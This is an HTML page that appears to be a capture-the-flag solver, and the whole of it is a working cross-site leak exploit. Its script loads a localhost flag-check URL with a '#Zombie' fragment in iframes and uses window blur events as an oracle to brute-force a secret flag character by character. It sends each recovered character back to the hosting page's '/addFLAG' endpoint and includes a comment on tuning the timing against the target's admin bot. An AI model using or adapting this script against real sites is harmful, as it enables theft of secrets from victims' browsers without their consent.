<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zombie_Solver</title>
</head>
<body>
    <script>
        (async () => {
            
            const ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_ ";

            const leak = async (url) => {
                return new Promise(r => {
                    let iframe = document.createElement('iframe')

                    // we lost focus so id matches
                    window.onblur = async () => {
                        console.debug('onblur fired')
                        window.onblur = ''
                        // we need to wait so chrome dosnt crash when removing the iframe
                        await sleep(100)
                        iframe.remove()
                        return r(1)
                    }

                    // no match
                    setTimeout(() => {
                        window.onblur = ''
                        iframe.remove()
                        return r(0)
                    }, 400) // calibrate timeout based on server's admin bot

                    iframe.src = `${url}#Zombie`

                    document.body.appendChild(iframe)
                })
            }

            const sleep = (ms) => {
                return new Promise(resolve => setTimeout(resolve, ms));
            }

            // Repeat this for each letter to get the flag
            let curr = '{{  flag  }}'
            
            for (let i = 0; i < 30; i++) {
                let found = false;
                for (let j = 0; j < ALPHABET.length; j++) {
                    let temp = curr + ALPHABET[j];
                    console.log(`Trying: ${temp}`);
                    fetch("/try..." + decodeURIComponent(temp));

                    if (await leak(`http://localhost/flag?flag=${temp}`)) {                        
                        fetch("/addFLAG?flag=" + decodeURIComponent(ALPHABET[j]));
                        curr += ALPHABET[j];
                        found = true;
                        break;
                    }
                }
                if (!found) break; 
            }
        })()
    </script>
</body>
</html>
